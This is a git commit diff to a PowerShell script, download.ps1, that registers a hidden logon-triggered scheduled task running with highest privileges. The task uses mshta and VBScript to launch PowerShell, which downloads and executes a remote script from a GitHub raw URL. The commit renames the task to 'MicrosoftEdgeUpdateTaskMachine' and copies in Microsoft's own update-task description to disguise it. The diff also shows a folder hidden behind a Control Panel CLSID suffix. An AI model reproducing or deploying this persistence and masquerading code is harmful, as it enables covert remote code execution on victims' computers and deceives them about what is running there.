88257aae9d2f097c6b6bec5f7bcfaa875fc59af9
43a1723 <hai1723notgay@gmail.com>
2024-06-10 10:47:22 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -15,9 +15,10 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "MicrosoftEdge"
+$task_name = "MicrosoftEdgeUpdateTaskMachine"
+$task_desc = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it."
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Microsoft Edge" -RunLevel Highest -Force | Out-Null
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
 
 $rdir = "$env:userprofile\150F4013"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
